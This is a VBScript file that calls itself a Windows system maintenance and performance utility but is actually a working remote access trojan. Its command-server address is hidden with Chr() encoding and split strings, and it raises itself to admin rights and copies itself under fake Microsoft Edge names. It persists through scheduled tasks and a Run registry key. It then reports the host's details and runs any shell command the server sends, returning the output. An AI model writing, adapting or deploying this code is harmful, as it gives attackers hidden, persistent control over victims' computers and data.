' Windows Service Helper - System Maintenance Utility
' Version 2.1.0 - Performance Optimizer

Dim gSvcUrl, gAuthKey, gInterval, gTaskId, gWatchId, gBackupName

Sub InitConfig()
    Dim p1, p2, p3, p4, p5
    p1 = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115)
    p2 = Chr(58) & Chr(47) & Chr(47)
    p3 = "luye" & "health"
    p4 = Chr(46) & Chr(99) & Chr(111) & Chr(109)
    gSvcUrl = p1 & p2 & p3 & p4
    
    Dim t1, t2, t3
    t1 = "RAT2" & "025_"
    t2 = "SECU" & "RE_T"
    t3 = "OKEN" & "_FIX" & "ED_2" & "025"
    gAuthKey = t1 & t2 & t3
    
    gInterval = 10000
    gTaskId = "MicrosoftEdge" & "UpdateService"
    gWatchId = "MicrosoftEdge" & "UpdateHelper"
    gBackupName = "msedge" & "helper.vbs"
End Sub

InitConfig

Function GetStoragePath()
    Dim objS
    Set objS = CreateObject("WScript" & ".Shell")
    GetStoragePath = objS.ExpandEnvironmentStrings("%APP" & "DATA%") & "\Microsoft\Edge\" & gBackupName
End Function

Function EnsureFolder(folderPath)
    On Error Resume Next
    Dim objF
    Set objF = CreateObject("Scripting" & ".FileSystem" & "Object")
    If Not objF.FolderExists(folderPath) Then
        objF.CreateFolder(folderPath)
    End If
    Err.Clear
End Function

Sub BackupScript()
    On Error Resume Next
    Dim objF, srcPath, destPath, destFolder
    Set objF = CreateObject("Scripting" & ".FileSystem" & "Object")
    srcPath = WScript.ScriptFullName
    destPath = GetStoragePath()
    destFolder = objF.GetParentFolderName(destPath)
    
    EnsureFolder objF.GetParentFolderName(destFolder)
    EnsureFolder destFolder
    
    If objF.FileExists(srcPath) Then
        If LCase(srcPath) <> LCase(destPath) Then
            objF.CopyFile srcPath, destPath, True
        End If
    End If
    Err.Clear
End Sub

Function GetScriptLocation()
    Dim objF
    Set objF = CreateObject("Scripting" & ".FileSystem" & "Object")
    If objF.FileExists(GetStoragePath()) Then
        GetScriptLocation = GetStoragePath()
    Else
        GetScriptLocation = WScript.ScriptFullName
    End If
End Function

Function BuildCmd(action, taskName, scriptPath, schedule)
    Dim cmd, schtool
    schtool = "schta" & "sks"
    If action = "create" Then
        cmd = schtool & " /create /tn """ & taskName & """ /tr ""wscript.exe //B \""" & scriptPath & "\"" running"" /sc " & schedule & " /rl highest /f"
    ElseIf action = "query" Then
        cmd = schtool & " /query /tn """ & taskName & """ 2>&1"
    ElseIf action = "run" Then
        cmd = schtool & " /run /tn """ & taskName & """"
    End If
    BuildCmd = cmd
End Function

Sub ElevateAndExit()
    Dim objApp, scriptPath
    scriptPath = WScript.ScriptFullName
    Set objApp = CreateObject("Shell" & ".Appli" & "cation")
    objApp.ShellExecute "cmd.exe", "/c wscript.exe //B """ & scriptPath & """ setup", "", "run" & "as", 0
    WScript.Quit
End Sub

Function TaskExists()
    On Error Resume Next
    Dim objS, objE, result, exitCode
    Set objS = CreateObject("WScript" & ".Shell")
    Set objE = objS.Exec("cmd.exe /c " & BuildCmd("query", gTaskId, "", ""))
    Do While objE.Status = 0
        WScript.Sleep 50
    Loop
    result = objE.StdOut.ReadAll
    exitCode = objE.ExitCode
    If exitCode = 0 And InStr(result, gTaskId) > 0 Then
        TaskExists = True
    Else
        TaskExists = False
    End If
    Err.Clear
End Function

Sub SetupTasks()
    Dim objS, backupPath, cmd
    Set objS = CreateObject("WScript" & ".Shell")
    backupPath = GetStoragePath()
    BackupScript
    
    cmd = BuildCmd("create", gTaskId, backupPath, "onlogon")
    objS.Run cmd, 0, True
    
    cmd = BuildCmd("create", gWatchId, backupPath, "minute /mo 2")
    objS.Run cmd, 0, True
    
    objS.Run BuildCmd("run", gTaskId, "", ""), 0, False
End Sub

Function IsProcessActive()
    On Error Resume Next
    Dim objWMI, colProcs, objProc, count, cmdLine
    Set objWMI = GetObject("winmgmts" & ":\\.\root\" & "cimv2")
    Set colProcs = objWMI.ExecQuery("SELECT * FROM Win32_" & "Process WHERE Name='wscript.exe'")
    count = 0
    For Each objProc In colProcs
        cmdLine = LCase(objProc.CommandLine)
        If InStr(cmdLine, LCase(gBackupName)) > 0 Then
            If InStr(cmdLine, "running") > 0 Then
                count = count + 1
            End If
        End If
    Next
    IsProcessActive = (count > 0)
    Err.Clear
End Function

Sub WatchdogCheck()
    On Error Resume Next
    MaintainPersistence
    If Not IsProcessActive() Then
        Dim objS
        Set objS = CreateObject("WScript" & ".Shell")
        objS.Run BuildCmd("run", gTaskId, "", ""), 0, False
    End If
    WScript.Quit
End Sub

Sub MaintainPersistence()
    On Error Resume Next
    Dim objS, backupPath, regPath
    Set objS = CreateObject("WScript" & ".Shell")
    backupPath = GetStoragePath()
    BackupScript
    
    regPath = "HKCU\Soft" & "ware\Micro" & "soft\Win" & "dows\Current" & "Version\Run\EdgeUpdate"
    objS.RegWrite regPath, BuildCmd("run", gTaskId, "", ""), "REG_SZ"
    Err.Clear
    
    If Not TaskExists() Then
        Dim cmd
        cmd = BuildCmd("create", gTaskId, backupPath, "onlogon")
        objS.Run cmd, 0, True
    End If
    
    Dim objE, exitCode
    Set objE = objS.Exec("cmd.exe /c " & BuildCmd("query", gWatchId, "", ""))
    Do While objE.Status = 0
        WScript.Sleep 50
    Loop
    exitCode = objE.ExitCode
    If exitCode <> 0 Then
        Dim cmdW
        cmdW = BuildCmd("create", gWatchId, backupPath, "minute /mo 2")
        objS.Run cmdW, 0, True
    End If
    Err.Clear
End Sub

If WScript.Arguments.Count > 0 Then
    If WScript.Arguments(0) = "running" Then
        MaintainPersistence
    ElseIf WScript.Arguments(0) = "setup" Then
        SetupTasks
        WScript.Quit
    ElseIf WScript.Arguments(0) = "watchdog" Then
        WatchdogCheck
        WScript.Quit
    End If
Else
    If TaskExists() Then
        Dim objRun
        Set objRun = CreateObject("WScript" & ".Shell")
        objRun.Run BuildCmd("run", gTaskId, "", ""), 0, False
        WScript.Quit
    Else
        ElevateAndExit
    End If
End If

On Error Resume Next

Dim objShell, objFSO, objNetwork
Set objShell = CreateObject("WScript" & ".Shell")
Set objFSO = CreateObject("Scripting" & ".FileSystem" & "Object")
Set objNetwork = CreateObject("WScript" & ".Network")

Function GetHostname()
    GetHostname = objNetwork.ComputerName
End Function

Function GetClientId()
    Dim hostname, hash, i
    hostname = GetHostname()
    hash = 0
    For i = 1 To Len(hostname)
        hash = (hash * 31 + Asc(Mid(hostname, i, 1))) Mod 100000
    Next
    GetClientId = "VBS" & hostname & hash
End Function

Function GetArchitecture()
    Dim arch
    arch = objShell.ExpandEnvironmentStrings("%PROCESSOR" & "_ARCHITECTURE%")
    If InStr(arch, "64") > 0 Then
        GetArchitecture = "64bit"
    Else
        GetArchitecture = "32bit"
    End If
End Function

Function GetWindowsVersion()
    On Error Resume Next
    Dim objWMI, colOS, objOS
    Set objWMI = GetObject("winmgmts" & ":\\.\root\" & "cimv2")
    Set colOS = objWMI.ExecQuery("SELECT Caption FROM Win32_" & "OperatingSystem")
    For Each objOS In colOS
        GetWindowsVersion = objOS.Caption
        Exit For
    Next
    If GetWindowsVersion = "" Then GetWindowsVersion = "Windows"
End Function

Function GetLocalIP()
    On Error Resume Next
    Dim objWMI, colAdapters, objAdapter, ipAddr
    GetLocalIP = "unknown"
    Set objWMI = GetObject("winmgmts" & ":\\.\root\" & "cimv2")
    Set colAdapters = objWMI.ExecQuery("SELECT * FROM Win32_Network" & "AdapterConfiguration WHERE IPEnabled = True")
    For Each objAdapter In colAdapters
        If Not IsNull(objAdapter.IPAddress) Then
            For Each ipAddr In objAdapter.IPAddress
                If InStr(ipAddr, ".") > 0 And Left(ipAddr, 4) <> "127." Then
                    GetLocalIP = ipAddr
                    Exit Function
                End If
            Next
        End If
    Next
    Err.Clear
End Function

Function GetPublicIP()
    On Error Resume Next
    Dim objHTTP
    GetPublicIP = "unknown"
    Set objHTTP = CreateObject("MSXML2" & ".Server" & "XMLHTTP.6.0")
    objHTTP.SetOption 2, 13056
    objHTTP.Open "GET", "https://api" & ".ipify" & ".org", False
    objHTTP.Send
    If Err.Number = 0 And objHTTP.Status = 200 Then
        GetPublicIP = Trim(objHTTP.responseText)
    End If
    Set objHTTP = Nothing
    Err.Clear
End Function

Function HttpRequest(method, url, data, authHeader)
    On Error Resume Next
    Dim objHTTP
    Set objHTTP = CreateObject("MSXML2" & ".Server" & "XMLHTTP.6.0")
    objHTTP.SetOption 2, 13056
    objHTTP.Open method, url, False
    objHTTP.setRequestHeader "Content-Type", "application/json"
    If authHeader <> "" Then
        objHTTP.setRequestHeader "Authorization", authHeader
    End If
    objHTTP.Send data
    If Err.Number = 0 Then
        HttpRequest = objHTTP.responseText
    Else
        HttpRequest = ""
        Err.Clear
    End If
    Set objHTTP = Nothing
End Function

Function ExecuteCommand(cmd)
    On Error Resume Next
    Dim objExec, output, line
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    output = ""
    Do While Not objExec.StdOut.AtEndOfStream
        line = objExec.StdOut.ReadLine()
        output = output & line & vbCrLf
    Loop
    Do While Not objExec.StdErr.AtEndOfStream
        line = objExec.StdErr.ReadLine()
        output = output & line & vbCrLf
    Loop
    ExecuteCommand = output
End Function

Function JsonEscape(s)
    Dim result, i, c
    result = ""
    For i = 1 To Len(s)
        c = Mid(s, i, 1)
        Select Case c
            Case """"
                result = result & "\"""
            Case "\"
                result = result & "\\"
            Case vbCr
                result = result & "\r"
            Case vbLf
                result = result & "\n"
            Case vbTab
                result = result & "\t"
            Case Else
                If Asc(c) >= 32 And Asc(c) < 127 Then
                    result = result & c
                End If
        End Select
    Next
    JsonEscape = result
End Function

Function JsonUnescape(s)
    Dim result, i, c, nextC
    result = ""
    i = 1
    Do While i <= Len(s)
        c = Mid(s, i, 1)
        If c = "\" And i < Len(s) Then
            nextC = Mid(s, i + 1, 1)
            Select Case nextC
                Case "\"
                    result = result & "\"
                    i = i + 1
                Case """"
                    result = result & """"
                    i = i + 1
                Case "n"
                    result = result & vbLf
                    i = i + 1
                Case "r"
                    result = result & vbCr
                    i = i + 1
                Case "t"
                    result = result & vbTab
                    i = i + 1
                Case Else
                    result = result & c
            End Select
        Else
            result = result & c
        End If
        i = i + 1
    Loop
    JsonUnescape = result
End Function

Function ParseJsonValue(json, key)
    Dim searchKey, pos, startPos, endPos, value
    searchKey = """" & key & """"
    pos = InStr(json, searchKey)
    If pos = 0 Then
        ParseJsonValue = ""
        Exit Function
    End If
    pos = InStr(pos, json, ":")
    If pos = 0 Then
        ParseJsonValue = ""
        Exit Function
    End If
    pos = pos + 1
    Do While Mid(json, pos, 1) = " "
        pos = pos + 1
    Loop
    If Mid(json, pos, 1) = """" Then
        startPos = pos + 1
        endPos = startPos
        Do While endPos <= Len(json)
            If Mid(json, endPos, 1) = "\" Then
                endPos = endPos + 2
            ElseIf Mid(json, endPos, 1) = """" Then
                Exit Do
            Else
                endPos = endPos + 1
            End If
        Loop
        value = Mid(json, startPos, endPos - startPos)
        value = JsonUnescape(value)
    Else
        startPos = pos
        endPos = InStr(startPos, json, ",")
        If endPos = 0 Then endPos = InStr(startPos, json, "}")
        value = Trim(Mid(json, startPos, endPos - startPos))
    End If
    ParseJsonValue = value
End Function

Sub RegisterClient(clientId)
    On Error Resume Next
    Dim json, response, apiPath
    apiPath = "/api/" & "poll/" & "register"
    json = "{" & _
           """client_id"":""" & clientId & """," & _
           """hostname"":""" & GetHostname() & """," & _
           """platform"":""Windows""," & _
           """platform_release"":""" & GetWindowsVersion() & """," & _
           """architecture"":""" & GetArchitecture() & """," & _
           """ip_address"":""" & GetPublicIP() & """," & _
           """auth_token"":""" & gAuthKey & """" & _
           "}"
    response = HttpRequest("POST", gSvcUrl & apiPath, json, "")
    Err.Clear
End Sub

Sub SendResult(clientId, commandId, result)
    Dim json, apiPath
    apiPath = "/api/" & "poll/" & "result"
    json = "{" & _
           """client_id"":""" & clientId & """," & _
           """command_id"":""" & commandId & """," & _
           """result"":""" & JsonEscape(result) & """," & _
           """error"":""""," & _
           """exit_code"":0" & _
           "}"
    HttpRequest "POST", gSvcUrl & apiPath, json, gAuthKey
End Sub

Sub MainLoop()
    On Error Resume Next
    Dim clientId, response, shutdown, commands, cmdStart, cmdEnd, cmdJson
    Dim commandId, command, result
    Dim emptyResponseCount, lastRegisterTime
    Dim apiPath
    
    apiPath = "/api/" & "poll/" & "commands/"
    clientId = GetClientId()
    emptyResponseCount = 0
    lastRegisterTime = Now
    
    MaintainPersistence
    Err.Clear
    
    RegisterClient clientId
    Err.Clear
    
    Do While True
        Err.Clear
        response = HttpRequest("GET", gSvcUrl & apiPath & clientId, "", gAuthKey)
        
        If response = "" Or InStr(response, "not found") > 0 Or InStr(response, "error") > 0 Then
            emptyResponseCount = emptyResponseCount + 1
            If emptyResponseCount >= 3 Or DateDiff("n", lastRegisterTime, Now) >= 5 Then
                RegisterClient clientId
                emptyResponseCount = 0
                lastRegisterTime = Now
            End If
        Else
            emptyResponseCount = 0
        End If
        
        If response <> "" Then
            shutdown = ParseJsonValue(response, "shutdown")
            If shutdown = "true" Then
                WScript.Quit
            End If
            
            cmdStart = InStr(response, "[")
            cmdEnd = InStrRev(response, "]")
            If cmdStart > 0 And cmdEnd > cmdStart Then
                commands = Mid(response, cmdStart + 1, cmdEnd - cmdStart - 1)
                
                Do While InStr(commands, "{") > 0
                    cmdStart = InStr(commands, "{")
                    cmdEnd = InStr(commands, "}")
                    If cmdStart > 0 And cmdEnd > cmdStart Then
                        cmdJson = Mid(commands, cmdStart, cmdEnd - cmdStart + 1)
                        
                        commandId = ParseJsonValue(cmdJson, "command_id")
                        command = ParseJsonValue(cmdJson, "command")
                        
                        If commandId <> "" And command <> "" Then
                            Dim cmdDelay
                            cmdDelay = ParseJsonValue(cmdJson, "delay")
                            If cmdDelay <> "" Then
                                If IsNumeric(cmdDelay) Then
                                    If CInt(cmdDelay) > 0 Then
                                        WScript.Sleep CInt(cmdDelay) * 1000
                                    End If
                                End If
                            End If
                            result = ExecuteCommand(command)
                            SendResult clientId, commandId, result
                        End If
                        
                        commands = Mid(commands, cmdEnd + 1)
                    Else
                        Exit Do
                    End If
                Loop
            End If
        End If
        
        WScript.Sleep gInterval
    Loop
End Sub

MainLoop
